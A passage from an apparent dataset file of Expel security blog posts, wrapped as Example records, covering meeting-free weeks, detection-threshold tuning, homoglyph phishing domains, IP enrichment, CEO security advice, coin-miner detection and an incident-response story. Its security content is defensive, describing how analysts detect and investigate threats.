instead of restarting on change. This alleviated hot-spots around waiting for Kafka partition ownership to settle, further decreasing the time it took for detection content to go live. I hope that this post helped give you some ideas and maybe even saved you some time problem solving. Want to play around with some of the things weve built? Check out the Expel Workbench for AWS .'}) (input_keys={'title'}),
  Example({'title': 'Could you go a week without meetings at work?', 'url': 'https://expel.com/blog/week-without-meetings/', 'date': 'Dec 8, 2020', 'contents': 'Subscribe  EXPEL BLOG Could you go a week without meetings at work? Talent  3 MIN READ  LAURA KOEHNE  DEC 8, 2020  TAGS: Company news / Employee retention / Guide Waitwhat!? If you felt your stomach tighten in horror, followed quickly by a thrill up your spine at the idea of a whole week without meetings, youre not alone. Many Expletives felt the same as we prepared for our first Week Without Meetings in September. Eliminating all internal meetings for a week is a bold move, one designed to shock the system and make us more intentional about our meeting choices. The experiment paid off by increasing flexibility, and giving us the space and energy we needed. Want to try this at your company? Here are some lessons learned at Expel and tips for how your company can do it too. Why a week without meetings First, whyd we do it? As school started, wed heard from parents and caregivers that what was needed most was flexibility to do work at a time when they personally had fewer distractions, along with fewer meetings. And we generally agreed that meeting-stuffed days, with hours on Zoom, were draining and left little time for individuals to do work and, even more important, work on strategic projects. We wanted to change Expels meeting culture: Reducing the number of meetings (yes!) while improving the value of remaining meetings and encouraging more asynchronous collaboration. Pro tip: Before scheduling a week without meetings, define specific objectives for your program. Its not enough to just stop meeting for a week. Youll want to use the pause created by this event to support long-term behavior changes that meet your objectives. Expel focused on these behaviors: Being intentional about the decision to have a meeting Making the meetings we do have more productive Using asynchronous collaboration to work together more flexibly Getting feedback on our meetings for continuous improvement Heres a quick decision tree we created to help employees decide whether or not they needed to schedule a meeting: Meeting decision tree adapted from Real Life E Time Coaching and Training But why actually stop meetings? Eliminating all internal meetings for the whole week may seem drastic, but sometimes when youre after urgent, collective behavior change you need a big gesture. We wanted to catch attention immediately, to build awareness and have all Expletives experience the positive benefits of having fewer meetings first-hand, together. Plus, we couldnt very well schedule a meeting to talk about reducing meetings, could we? (Although, to be honest, those of us planning it met a lot while working out the detailsgo figure!) How did you pull it off? A Week Without Meetings gave us the loud pause we needed to slow down and become more selective about our meeting habits. Here are the steps we took at Expel to prepare our people for a week without meetings (you can use these tips, too): Give several weeks advance notice so people can reorganize their schedules. Provide clear guidance and explicit permission for making decisions about which meetings to schedule and accept. (Our goal was to eliminate all internal meetings. Some meetings stayed: customers, of course, and a few managers met with job candidates or onboarded new hires. The point is to discern what can only be done in a meeting.) No meetings doesnt mean no work. Depending on what youre trying to do, there are plenty of ways to collaborate outside of meetings . Help your team use the tools available to them. Help managers prepare their teams for Week Without Meetings. Discuss strategies for communicating and maintaining forward momentum for the week. Is that all? Remember, the week itself is part of a behavior change initiative that started before the big event, and continues to this day. Some other keys to our success include giving every Expel manager a chance to weigh in on the idea before it launched; preparing managers with talking points and tools to use with their teams; providing all Expletives with learning resources to support the changes (see a selection on sidebar) and continued reinforcement of key concepts by executives who share their meeting mojo with our company weekly. Would you do it again? Absolutely! In our first Week Without Meetings, many Expletives reported a noticeable increase in energy because they had more time to focus on getting work done. Interestingly, a good number said they became more engaged in their work. Overall we found the experience so beneficial, Expel just completed a second Week Without Meetings in November and plans to continue this tradition quarterly. Here are some key themes from the feedback in September: Week Without Meetings impact If youre going to implement your own Week Without Meetings, have a mechanism for gathering feedback asynchronously during that time. Share it at the start of the week and encourage people to post observations and ideas as they have them. Expel uses a hotwash document that asks whats going well, meh and badly. Derived from the hotwash, the bubbles above are keyed like a stoplight (green = good) and the size indicates the relative volume of comments by theme. A final word If an idea brings up a knee-jerk No way! follow it up with a Why not?Without that approach, Expels Week Without Meetings wouldnt have made it off the drawing board. Go ahead. Ask Why not?and see what happens when you ditch meetings for a week. We cant wait to hear how it goes. If you try it, send us a note  we want to hear about your experience .'}) (input_keys={'title'}),
  Example({'title': 'Creating data-driven detections with DataDog and ...', 'url': 'https://expel.com/blog/creating-data-driven-detections-datadog-jupyterhub/', 'date': 'Feb 11, 2020', 'contents': 'Subscribe  EXPEL BLOG Creating data-driven detections with DataDog and JupyterHub Security operations  5 MIN READ  DAN WHALEN  FEB 11, 2020  TAGS: Get technical / How to / SOC / Tools Ask a SOC analyst whether brute forcing alerts brings them joy and Ill bet youll get a universal and emphatic no. If you pull on that thread, youll likely hear things like Theyre always false positives, We get way too many of them and They never actually result in any action. So whats the point? Should we bother looking at these kinds of alerts at all? Well, as it often turns out when you work in information security  its complicated. Although detections for brute forcing, password spraying or anything based on a threshold are created with good intentions, theres always a common challenge: Whats the right number to use as that threshold? More often than wed like to admit, we resort to hand waving and following our gut to decide. The right threshold is hard to determine and as a result we end up becoming overly sensitive, or worse, our threshold is so high that it causes false negatives (which isnt a good look when a real attack occurs). At Expel, weve been working since day one to achieve balance: ensuring we have the visibility we need into our customers environments without annoying our analysts with useless alerts. How data and tooling can help As it turns out, security and DevOps challenges have quite a bit in common. For example, how many 500 errors should it take to page the on-call engineer? This is similar to a security use case like password spraying detection. These shared problems mean we can use a suite of tools that are shared between security and DevOps to help tackle security problems. Some of our go-to tools include: DataDog , which captures application metrics that are used for baselining and alerting; and JupyterHub , which provides a central place for us to create and share Jupyter Notebooks. Step 1: Gather the right data To arrive at detection thresholds that work for each customer (by the way, every customer is different  theres no one size fits all threshold), we need to collect the right data. To do this, we started sending metrics to DataDog reflecting how our threshold-based rules performed over time. This lets us monitor and adjust thresholds based on whats normal for each customer. For example, as our detection rule for password spraying processes events, it records metrics that include: Threshold Value , which is the value of the threshold at the time the event was processed; and Actual Value , which is how close we were to hitting the threshold when the event was processed. By charting these metrics,we can plot the performance of this detection over time to see how often were exceeding the threshold and if theres an opportunity to fine tune (increase or decrease it): This data is already useful  it allows us to visualize whether a threshold is right or not based on historical data. However, doing this analysis for all thresholds (and customers) would require lots of manual work. Thats where JupyterHub comes in. Step 2: Drive change with data Sure, we could build DataDog dashboards and manually review and update thresholds based on this data in our platform but theres still room to make this process easier and more intuitive. We want to democratize this data and enable our service delivery team (made up of SOC analysts, as well as our engagement management team) to make informed decisions without requiring DataDog-fu. Additionally, it should be easy for our engagement management team to discuss this data with our customers. This is exactly why we turned to JupyterHub  more specifically, Jupyter Notebooks. Weve talked all about how we use JupyterHub before , and this is another great use case for a notebook. We created a Jupyter Notebook that streamlined threshold analysis and tuning by: Querying DataDog metrics and plotting performance; Allowing the simulation of a new threshold value; and Recommending threshold updates automatically. As an example, a user can review a threshold like below, simulate a new threshold and decide on a new value thats informed by real-world data for that customer. This lets us have more transparent conversations with our customers about how our detection process works and is a great jumping off point to discuss how we can collaboratively fine tune our strategy. Additionally, we added a feature to automatically review historical performance data for all thresholds and recommend review for thresholds that appear to be too high or too low. Theres room for improvement here but weve already had luck with simply looking at how many standard deviations off we are from the threshold value on average. For example, heres what a threshold that is set way too high looks like: By automating data gathering and providing a user interface, we enabled our service delivery team to review and fine tune thresholds. JupyterHub was key to our success by allowing us to quickly build an intuitive interface and easily share it across the team. Step 3: Correlate with additional signals Arriving at the right threshold for the detection use case is one important part of the puzzle, but that doesnt completely eliminate the SOC pain. Correlation takes you that last (very important) mile to alerts that mean something. For example, we can improve the usefulness of brute force and password spraying alerting by correlating that data with additional signals like: Successful logins from the same IP , which may indicate a compromised account that needs to be remediated; Account lockouts from the same IP , which can cause business disruption; and Enrichment data from services like GreyNoise , that help you determine whether this is an internet-wide scan or something just targeted at your org. By focusing on the risks in play and correlating signals to identify when those risks are actually being realized, youll significantly reduce noisy alerts. Every detection use case is a bit different, but weve found that this is generally a repeatable exercise. Putting detection data to work Detection data  in particular, knowing what true negatives and true positives look like  gives us the capability to more effectively research and experiment with different ways to identify malicious activity. One example of this comes from our data science team. Theyve been looking into ways to avoid threshold-based detection to identify authentication anomalies. The example you see below shows how they used seasonal trends in security signals for a particular customer to identify potential authentication anomalies. By using that seasonal decomposition combined with the ESD (Extreme Studentized Deviate) test to look for extreme values, we can identify anomalous behavior that goes beyond the usual repetitive patterns we typically see. Thanks to these insights, we can automatically adjust our anomaly thresholds to account for those seasonal anomalies. Were lucky to have tools like DataDog and JupyterHub at our disposal at Expel, but improving detections is still possible without them. If you havent yet invested in new tools, or are just getting started on continuously improving your detections, ask the following questions of the team and tools you already have: What does normal look like in my environment? (ex: 10 failures per day) When is action required? (ex: when an account is locked) What other signals can we correlate with? (ex: login success) How many true positive versus false positive alerts are we seeing? Questions like these give you the ability to reason about detection in terms of your environment and its unique risks. Regardless of where the answers come from, this feedback loop is important to manage your signal-to-noise ratio and keep your analysts happy. Big thanks to Elisabeth Weber for contributing her data science genius to this post!'}) (input_keys={'title'}),
  Example({'title': 'Customer context: beware the homoglyph', 'url': 'https://expel.com/blog/customer-context-beware-the-homoglyph/', 'date': '1 day ago', 'contents': 'Subscribe  EXPEL BLOG Customer context: beware the homoglyph Security operations  3 MIN READ  PAUL LAWRENCE AND ROGER STUDNER  MAY 16, 2023  TAGS: MDR This type of phishing attack can be ridiculously sneaky We love when our customers run red team engagements. Aside from testing and validating current security controls, detections, and response capabilities, we see it as a great opportunity to partner with our customers on areas of improvement. Heres the story of how a red team helped Expel improve our phishing service and how we used our platform capabilities to detect some sneaky activity. So, what happened? Our clientlets call them Acme Corphad an enterprising red teamer with a clever idea. For one of their exercises, the red team purchased a domain: cmehome[.]com. Notice anything odd? Lets look closer: cmehome[.]com vs acmehome[.]com If you missed it, dont feel bad. Thats the point. A bit of background The problem is that the a isnt an a at all, but an . Its a homoglyph one of two or more graphemes, characters, or glyphs with shapes that appear identical or very similar but may have differing meaning. This one specifically is a Vietnamese particle used at the end of the sentence to express respect. Fast Company called homoglyph attacks (aka homography or Punycode attacks) one of the four most intriguing cyberattacks of 2022 . [Theyre] a type of phishing scam where adversaries create fake domain names that look like legitimate names by abusing International Domain Names that contain one or more non-ASCII characters. In other words, hackers discovered at some point that a lot of alphabets, like the Cyrillic and Russian alphabets, have characters that look like English or what we call Latin English. So, a Cyrillic a will be different from a Latin English a, but when these characters are used in domain names, they are indistinguishable to the naked eye. This allows phishers to spoof brand names and create look-alike domains which can be displayed in browser address bars if IDN display is enabled. There are lots of homoglyphs and the potential for mischief is off the hook (which is why top-level domain registries and browser designers are exploring ways to minimize the risks of hmgIph chs). Theres even a homoglyph attack geerator. This app is meant to make it easier to generate homographs based on homoglyphs than having to search for a look-a-like character in Unicode, then copying and pasting. Please use only for legitimate pen-test purposes and user awareness training. [emphasis added] Back to Acme. The red teams fake domain used the Vietnamese homoglyph to trick users into thinking its the actual domainin this case, acmehome[.]comwhen that itty-bitty dot under the a makes a huge difference. The tactic also relies on a security operations center (SOC) analyst whos been staring at mind-numbing alerts slipping up and not noticing the difference in domain names. In truth, for most SOCs and attackers, this isnt a bad strategy. What we did After meeting with the red teamers, we uncovered a need to better scrutinize unique domains within emails that could intentionally trick the naked eye. Technology to the rescue. Since we have a content-driven platform capabilitycustomer context (CCTX)Expel was easily able to change the platform behavior to recognize the attack for that homoglyph site in Acmes Workbench. Having a platform thats content-driven means Expel users can change how the platform operates without having to engage with engineering teams to release new features. NOTE: When you have a platform that allows users to drive content and configuration, it means that once you understand how a feature works, you can bring your own creativity to solving problems. Its really fun when youre able to adapt a feature (especially if it allows for \u200crapid response to new or emerging techniques) to accomplish something unanticipated during the design of the featurewhich is what happened in this case. The result? Acme Corps red team conducted a similar attack again, and this time the SOC caught it with CCTX. What does it all mean? Multiple things, possibly. First, homoglyphs represent a technique that SOCs need to account for. Second, there are branding reasons (as well as security ones) to sort homoglyph usage. While most businesses with accents and other homoglyphs in their names (Socit Gnrale, A.P. Mller-Mrsk, and Nestl come to mind), they typically use unaccented letters in their URLs. Would an analyst notice if a phishing attack used the homoglyph? Or, if the accented URL works (for example, loral.com), what if hackers put a different accent into play ( vs )? Third, this potentially matters even more for companies in nations whose languages employ \u200cextended iconography (this includes most non-English-speaking countries). Which means it matters more for cybersecurity firms serving them. Like us. Short version: homoglyph attacks are prevalent and sneaky. They pose particular challenges for human analysts, but as our Acme Corp case demonstrates, the combination of well-placed automation and humans leads to great results. If you have questions, or \u200cthink your organization might be at risk, drop us a line .'}) (input_keys={'title'}),
  Example({'title': 'Cutting Through the Noise: RIOT Enrichment Drives SOC ...', 'url': 'https://expel.com/blog/cutting-through-the-noise/', 'date': 'Jul 15, 2022', 'contents': 'Subscribe  EXPEL BLOG Cutting Through the Noise: RIOT Enrichment Drives SOC Clarity Security operations  2 MIN READ  EVAN REICHARD AND IAN COOPER  JUL 15, 2022  TAGS: MDR / Tech tools Flash back to your days in the SOC. An alert shows up and your investigative habits kick in ( OSCAR , anyone?). It takes a few minutes, but you eventually determine that this alert is benign network traffic and not, in fact, command and control (c2) traffic to attacker-controlled infrastructure. Can you remember what information you used to reach that conclusion? (Of course not, but maybe remembering a particular third-party open source intelligence (OSINT) tool or query is enough to generate a sense of nostalgia for you.) At Expel, we arm our analysts with the best OSINT available to quickly and accurately spot benign or false positive alerts. This creates space to tackle suspicious activity head-on. More signal. Less noise. Enter the Greynoise RIOT (Rule It Out) API. Greynoise RIOT API To paraphrase the Greynoise team, RIOT adds context to IPs observed in network traffic between common business applications like Microsoft Office 365, Google Workspace, and Slack or services like CDNs (content delivery networks) and public DNS (domain name system) servers. These business applications often use unpublished or dynamic IPs, making it difficult for security teams to keep track of expected IP ranges. Without context, this benign network traffic can distract the SOC from investigating higher priority security signals. We use the RIOT API, plus several other enrichment sources, to help our analysts quickly recognize IPs associated with business services and dispatch network security alerts that dont require further investigation. Ruxie, our ever-inquisitive security bot, uses these APIs to collect enrichment information and parse the results for human consumption. RIOT Destination IP Summary RIOT info guides analysts as they orient themselves with alerts. A color-coded enrichment workflow helps them identify noteworthy details. For example, RIOT recognizes the above IP as trust level 2 , but its classified as a CDN. Attackers can use a CDN to obfuscate their true source via domain fronting. IPs tagged as trust level 1 are more likely to be associated with an IP thats managed by a business or service, rather than a CDN. \ufeff CSI: Cyber  All I got is green code Ruxie also enriches other pieces of network evidence, like domains. Analysts can immediately see the date a domain was registered: a recently registered domain should be treated with additional scrutiny since theyre often associated with recently built attacker infrastructure. Malicious domains tend to be promptly taken down, forcing attackers to start over from scratch. More advanced attackers are known to buy and hold useful domain names for extended periods prior to an attack. RIOT arms our analysts with a simple, colorized tool for surfacing enrichment details so the SOC can quickly spot and dispatch non-threat activity. This means that when Josie (our detection engine) and Ruxie (our orchestration bot) have decided an alert is worthy of review, the SOC can get to work on a triage knowing theyre not wasting their time.'}) (input_keys={'title'}),
  Example({'title': "Dear fellow CEO: do these seven things to improve your org's ...", 'url': 'https://expel.com/blog/dear-fellow-ceo-do-these-seven-things-to-improve-orgs-security-posture/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG Dear fellow CEO: do these seven things to improve your orgs security posture Tips  6 MIN READ  DAVE MERKEL  APR 17, 2019  TAGS: Managed security / Management / Overview / Planning Youre at the helm of a fast-growing company. Youre adding staff rapidly, and your team is starting to specialize. Hopefully most of your folks now have one job (or maybe two) instead of the five or six everyone had in the early days. Customers are flying at you left and right (not a bad thing!). Leading a fast-growing org has its perks. And yeah, its exciting. But as you scale, youll inevitably be breaking things as you stress the organization and look to add more capabilities and maturity everywhere you can. Oh, and did I mention that the snake that kills you today starts to change shape as you grow, too? It used to be that you were crossing your fingers to make the quarter. Now its, Do we have mature enough finance and business processes to support Sarbanes Oxley? Another challenge that often pops up if it hasnt already: Do you have any clue what youre doing around information security? Maybe you started to care about that yourself. Maybe a well-traveled board member started asking some uncomfortable questions. I get that information security is probably toward the bottom of your list of the snake(s) thatll kill you today. But heres the thing: a reckoning is coming and it usually shows up at a time thats least convenient. The good news: You can turn the (information security) ship around. Or get two hands back on the wheel if youve been spending your time focusing on other things. Here are seven simple things you can do right now thatll get your orgs security posture on track. 1. Hire an information security business executive, and have her or him report to you Yes, have this person report to you  the CEO. Dont be tempted to have him or her report the CIO, CTO or general counsel. You want a business executive that owns this domain as a close advisor, someone who can translate from security lingo to the language of your business and back again. This person should be a business executive . Someone that understands what your business does, its value proposition and the fact that their role isnt say no  its figure out how to say yes while managing risk. Heres a litmus test on whether or not you have the right person  do the CIO and/or CTO respect the CISOs technical acumen? Would you hesitate to put this person in front of your board of directors so he or she can educate them on what they should care about and how they should hold the organization accountable for security risk? Do you respect this individual as an executive and can you see yourself proactively seeking his or her counsel? If you answered no to any of those questions, keep looking. 2. Identify the orgs top information security risks and write them down As an executive, part of your job is to think about potential risks to the business and devise strategies to address them  like competitors, markets and external events that may impact your business. Security risks are as important to evaluate as any of the more traditional business concerns that youve historically considered. You have capable leaders to deal with risk in all parts of your business. They should all be at the table when youre talking about security because security impacts every part of your org. If you followed my advice above, youll have a CISO  he or she can (and should) drive this process for you. Additionally, have your general counsel think about the potential legal ramifications of a security incident. And what about your CFO? How will a security-related misstep impact your bottom line? You get the idea. Bring all those brains to the table and work together to think through the various risks and the ripple effects theyll have on the broader org. Your execs need to be bought into that response plan, not victims of it. 3. Create your incident response brain trust When something goes sideways (and trust me, it will) who will you call? Sure, the teams with technical expertise will be on the short list, but remember to think about all those potential ripple effects and make sure the right people are at the table when a bad thing happens. This includes legal counsel and even your corporate communications lead. Once again, your CISO will drive this process, but it needs to be sponsored by you so everyone knows its important. The best way to prepare for a real security incident is to flex those muscles and practice responding as a group. A great way to do this is to orchestrate a tabletop incident response exercise. Your CISO can get started with your own by downloading our guide to tabletop exercises right here, which has everything you need to simulate a security incident: Oh Noes! A New Approach to IR Tabletop Exercises . When the CISO comes to you to get it scheduled make sure you support the initiative and give it weight. 4. Build out a true security team Create a security team thats separate from IT. When security is fully subordinate to IT you run the risk of thinking about security as a technology problem instead of a risk management capability. When security is part of IT, it can incentivize bad behavior. Security could be viewed as purely a cost instead of a necessity to manage risk. As a result, it could face significant budget pressures. Putting security under IT can also make it difficult to champion certain kinds of spends. For example, maybe buying security technology widgets is easy since IT is used to buying tech. But perhaps doing thoughtful risk assessments that span not just technology but business objectives, processes and functions becomes more challenging, if not outright impossible. Radical pro tip: consider having your IT team report to security  we did it and it works. Remarkably well, in fact. IT decisions almost always involve some aspect of cyber risk. By having your IT function report into security you enable security to be woven into your IT processes and decision making. This helps your organization build security into your systems and infrastructure from the get-go rather than bolting it on as an afterthought. 5. Put some quick security controls in place while you build a security program Conducting thorough assessments to understand security risks and technical control gaps are great, but the reality is that attackers arent going to take a time out while you get your house in order. Thats why its essential that you and your CISO get (or keep) some basic security tools and processes in place quickly, while you simultaneously dive deep into a review of your security processes, programs and tools to figure out what needs fixing. As you work through your assessment, there are plenty of decisions youll need to make as you figure out how you want to operate and lay a foundation that minimizes risk. For example, do you want to build your own SOC or use a vendor? What framework will you use to build and measure your new security program? Do you need new technology or are the tools you already have sufficient? 6. Pick a security framework that youll use to assess your org Work with your CISO to pick a framework  there are plenty to choose from like the NIST Cybersecurity Framework , ISO 27001 , COBIT or something more specialized like HiTRUST  and stick with it. This will help your exec team communicate your position and plans in a consistent way among one another and with others (like your board, investors and outside counsel) wholl want those details. By using a framework to organize your planning and assessment activities, youll be able to develop a coherent strategic plan, figure out where the gaps are and start to close them quickly. As a bonus, if youve socialized the framework with your board, theyll be able to follow where you are on the journey and ask smarter questions. 7. Track your progress and learn from it Since you hired a CISO first , that person can drive this for you, and he or she will likely use the framework you picked above to backstop their conversations with you and your board about progress. As with so many things, your role is to give this weight. You need to care, ask questions and hold both your CISO and the rest of the organization accountable for delivering on initiatives to improve posture and manage risk. I know what youre thinking: This sounds like any other aspect of my business  get a leader, listen to their counsel, assess business risks and initiatives in their area, take prompt action and posture for future success. BINGO. Security is not mystical, as long as you treat it as another function thats just as important as other key areas of your business, and hire a security leader who is a true peer to the rest of your exec team.'}) (input_keys={'title'}),
  Example({'title': 'Detecting Coin Miners with Palo Alto Networks NGFW', 'url': 'https://expel.com/blog/detecting-coin-miners-with-palo-alto-networks-ngfw/', 'date': 'Jun 30, 2022', 'contents': 'Subscribe  EXPEL BLOG Detecting Coin Miners with Palo Alto Networks NGFW Security operations  5 MIN READ  MYLES SATTERFIELD, BRIAN BAHTIARIAN AND TUCKER MORAN  JUN 30, 2022  TAGS: MDR / Tech tools TL;DR 35% of the web application compromise incidents we saw in 2021 resulted in deployment of cryptocurrency coin miners. The Palo Alto Networks next-generation firewall (PAN NGFW) helps detect and investigate coin miner C2. This post walks through a cryptojacking example and provides helpful advice on how to avoid it in your own environment. Cybercriminals are always looking for new ways to make money. These methods dont always include holding data for ransom (although this tactic is a popular one). In fact, bad actors dont necessarily have to elevate privileges or move laterally to make their coin. Q: How? A: Cryptojacking . Cryptojacking is when a cybercriminal steals an organizations computing resources to mine various crypto currency blockchains. As our end-of-year report indicated, 35% of the web application compromise incidents we saw in 2021 resulted in deployment of various cryptocurrency coin miners. Its a sweet gig for the bad guys, too: after the miner is deployed, they can sit back, relax, and watch the money pile up. So how can organizations spot cryptojacking? One of the answers is Palo Alto Networks next-generation firewall (PAN NGFW) series. In addition to affording visibility into network traffic, PAN NGFW embeds different types of command and control (C2) detections. As the use of cryptojacking increases, weve noted how PAN NGFW has helped detect and investigate coin miner C2 activity in our customers environments. Throughout these investigations, weve used PAN NGFWspecifically, firewalls and Cortex XDR to quickly identify and respond to coin miner infections. To be clear: we dont believe coin miners are inherently badits the groups that are exploiting vulnerable web-apps for cryptojacking that are the problem. In this post, well walk through why weve found PAN NGFW is great at detecting cryptojacking, and some actions weve integrated into Ruxie, our detection bot, to help. Detecting cryptojacking with PAN NGFW Over the past year, 40% of PAN NGFW CoinMiner alerts triaged by our SOC were true positivean extremely high-performance result. In fact, anytime we ingest a PAN NGFW CoinMiner alert into Expel Workbench (our analyst platform) we create a high severity alert where we aim to have eyes on the activity within 15 minutes. Our response time for this class of alert? Six minutes. Bottom line: the fidelity of these alerts is quite good. In coin mining incidents detected by our SOC, PAN NGFW CoinMiner alerts typically detected network connections to known mining pools (for example,  moneropool[.]com ), use of the JSON-RPC protocol, methods (example:  mining.subscribe ) associated with coin mining, and algorithms used by the miner (example:  nicehash ). Lets consider an example PAN NGFW coin mining alert in Workbench, the investigative steps we take to determine if the activity is a true positive, and some Ruxie actions we use to boost our investigation. Lets walk through an example alert This is what a PAN NGFW CoinMiner alert would look like in Workbench. Initial Palo Alto next-generation firewall coin-miner alert First, lets take a look at the source and destination IP addresses and ports. We can see the source IP address starts with 10. indicating the address is internal to the organization. Additionally, the source and destination ports reveal that the source IP address is likely the client and the destination is the server. (The source port is a part of the ephemeral port range and the destination port is 80, and likely HTTP traffic.) Therefore, if this is coin miner traffic, its likely a miner installed on the internal machine reaching out to the mining server. Some quick research on the IP address indicates its likely part of a hosting provider. Shodan suggests the IP address has port 80 open, but its unclear as to what service is being offered. If we take a look at the application field, we see json-rpc is used. Some research shows crypto miners use json-rpc to communicate with their mining pools. Lets step through the communication flow covered in the reference: Diagram of json-rpc Stratum mining protocol The miner sends a login request to the mining pool for authorization If the authorization is successful, the server sends back a job for the miner to do After the miner completes the job, it sends back a submit to the mining pool server The server sends a response to the miner on whether the submission was successful or not The information from the alert and our research indicates this activity may align with coin mining. Now we can use information from Ruxie to get a better understanding of the traffic going back and forth. We have a Ruxie action that pulls netflow data involving the destination IP address- 45.9.148.21 . In the screenshot below, the data shows consistent communication from the source internal IP address 10.1.2.3 to the destination 45.9.148.21 . Additionally, theres consistency between the bytes being transferred each time the source IP connects to the destination. Netflow Ruxie action from source to destination IP addresses Finally, we have Ruxie download a packet capture file (PCAP) from the Palo Alto console (if available). Ruxie parses out readable strings as well as info from different layers in the packet. PCAP Ruxie Action What does this mean? The raw data from the packet above indicates active coin-mining activity. The json-rpc data suggests the server is giving the miner a job, specifying details such as the seed_hash and algorithm to use. This activity aligns with step 2 in the overview of mining communication traffic above. We can infer that a miner at or behind the source IP address performed the login process in step 1 because the server wouldnt have sent the job recorded in the PCAP if it didnt receive a successful login. At this point, we have enough evidence to conclude theres a coin miner installed on the host at or behind the IP address 10.1.2.3 . If we have access to endpoint technology, we can use it to determine what process is generating this traffic. We got emnow what? To improve resilience, we first ask, How did the coin miner get here? If we dont have access to the source machine of the activity, we may never uncover the answer. However, we can think about some of the common ways coin miners are deployed: Public application exploitation Attackers can exploit public-facing software thats vulnerable to a remote code execution (RCE) vulnerability to deploy crypto miners. How to prevent: Keep public-facing applications and software up-to-date. As our end-of-year report indicated, we typically see cybercriminals exploit one to three-year-old vulnerabilities. Access key compromise In the past, weve watched attackers gain access to long term Amazon Web Services (AWS) access keysaccess keys that start with AKIAand abuse access to deploy EC2 instances and run crypto miners on the deployed instances. How to prevent: Make sure you arent exposing access keys in public repositories and implement least privilege for AWS users. Phishing emails/USB devices Coin miners can be deployed via phishing emails or infected USB devices. How to prevent: Disable autorun on Windows 10 machines and educate end users on the impact of phishing emails. Key takeaways While we understand its next to impossible to completely prevent coin miners from being deployed in your environment, here are three key recs for detecting coin mining activity in your org: Look for internal-to-external connections over the json-rpc protocol or to known mining pools (Monerohash, c3pool, and minergate, among others). If youre using a Palo Alto firewall, investigate their CoinMiner Command and Control Traffic and XMRig Miner Command and Control Traffic alerts. Consider services like Shodan and Censys to see what the internet can see about your attack surface.'}) (input_keys={'title'}),
  Example({'title': 'Detection and response in action: an end-to-end coverage ...', 'url': 'https://expel.com/blog/detection-and-response-in-action-an-end-to-end-coverage-story/', 'date': 'Sep 8, 2022', 'contents': 'Subscribe  EXPEL BLOG Detection and response in action: an end-to-end coverage story Security operations  12 MIN READ  NATHAN SORREL  SEP 8, 2022  TAGS: MDR What does a comprehensive detection, response and threat hunting strategy look like? Glad you asked. Expel provides three primary service offeringsmanaged detection and response (MDR), phishing prevention, and threat huntingand we offer those in a few different flavors to customers around the world. One size doesnt fit all when it comes to service delivery. Each customers distinct environment, risk, and security posture requires that tools work together, so we built Expel to connect all of those services into one coherent, unified experience. The whole really is greater than the sum of its parts. So how do our MDR, phishing, and threat hunting services work, and most importantly, how do they work together ? The following soup-to-nuts description of Expels security process borrows details from several real-life detection situations, and the accounts illustrate how our team shut hackers down. While weve changed some particulars for the sake of privacy, this story accurately represents how our teams go from triaging alerts all the way to threat hunting and back. Well walk you through the entire incident to illustrate how different players on the team and our complementary services reinforce each other. Detection: alert and triage Its a Sunday at 7:17am EST. The day shift analysts have arrived and are catching up on last nights activity. Reading through customer communications and recent investigations, the analysts soak up the news. Tools are logged into, browser tabs are organized, and the day begins. Girish checks on a verification request for updates he sent to a customer yesterday. Jenni flips through alerts, looking for the weird. Chris puts the finishing touches on an investigation that looked odd at first, but was quickly explained by some research and a little IP prevalence mapping. Lets meet our talented crew. Girish, a detection and response analyst, helps keep all the balls in the air. His gift for leadership, organization, and process comes in handy when ensuring 247 coverage across three shifts and 25+ analysts. In a given week Expel analyzes hundreds of incidents and conducts dozens of investigations. Girish, and others like him, keep the trains running. Chris superpower is level-headedness. In security, where a frantic response can lead to disaster, Chris doesnt react, he responds, by taking a few seconds to reflect on the facts of a case. He radiates calmness, making the whole team make better, smarter decisions. Jenni seems to have threat intel on speed dial. She can research and document activity better than almost anyone. Offering accurate understanding and attribution regarding attack type can be profoundly helpful during an investigation. All of these folks have spent thousands of hours reviewing suspicious activity and investigating the really bad stuff from our customers. At 7:48 am EST, an alert arrives  DNS queries originating from the process Regsvr32.exe. Windows Defender ATP detects a common Windows binary making unusual network connections. This alert arrives in our medium severity queue and is examined by an analyst within 10 minutes. With our automation-forward approach, raw alerts are analyzed immediately by our detection bot, Josie. It commonly takes less than five minutes for Josie to escalate an alert to a human analyst, and for that analyst to confirm the alert is a threat. We consistently triage our highest fidelity alerts in about two minutes. We track our response time in minutes and we like it that way. Jenni takes a look and quickly notes the processes involved. Its parent is Winword.exe and Jenni begins to comb through its command line arguments. Her experience, combined with open-source tools like Echotrail.io, tell her that the process Regsvr32.exe isnt commonly generated by the Microsoft Word process. Its network connections heighten her interest, so she digs deeper. Beyond the experience of seeing thousands of alerts a month, our analysts use in-house datasets and open source tools (like Greynoise ) to determine the prevalence and meaning of observed events. Asking questions like, Is this activity actually uncommon on a global scale? and Does this IP address have a reputation? leads analysts to better understand what theyre seeing. Her first step is to look for any highlighted text on the Expel Workbench alert page, which may indicate this host was involved in a previously disclosed exercise. But the CCTX around the endpoint name shows no indication that this activity is known or expected. The host is not knownthe user is mukhiwonder who that is? Where is the Jennis voice trails off as she thinks aloud through the evidence in front of her. We call it customer context or CCTX. Its most commonly displayed in Workbench as highlighted text. CCTX can be any specific insight provided by the customer related to expected activity from users, endpoints, or network locations, and it helps us quickly assess a situation. Additionally, our analysts flag red team assets, previously compromised hosts, and other artifacts for future reference. Each piece of CCTX information saves our analysts minutes of research, keeping our alert-to-fix times low. After initial triage and lacking further context, Jenni creates an investigation within Workbench and sets about organizing her research. Response: investigation and context This one will require more time and digging. Jenni launches a PermaZoom 247 video call with the rest of the team. Anyone else see that one in the medium queue? It doesnt look right. More analysts jump in to help. DeShawn, always eager to lend a hand, takes a look. Im gonna see if any other hosts are talking to that domain, Tucker chimes in. Chris offers to scope the environment for other instances of the Word document. The Expel security operations center (SOC) is very much a team. Analysts bring their own capabilities and knowledge sets to the table and investigations quickly take shape around the collective strengths of the group. One analyst examines the endpoint within Microsoft Defender for Endpoint while another looks at IP/domain prevalence. A third examines recent phishing activity. Its not uncommon to have three or more analysts collaborating on the same incident. The collaboration between our analysts also extends to you. The Expel Workbench lets our customers see everything we see in real time  not after the fact. Workbench gives them potent investigative and data collection tools to power their own daily SOC activities. Jose, an Expel phishing analyst, says he just saw an email submission containing a Word document similar to the tax help one identified in the alert. Can someone grab the Word doc off the host? he asks. Analysts on the phishing team are pros at triaging suspicious documents. The faster Jose can get that file, the faster he can provide the support Jenni and the team need. Jose gets Chris help scoping for evidence of file execution while he compiles a list of users who received the email. While our services offer tremendous value individually, integrating them provides even more coverage against an attack  a benefit highlighted by 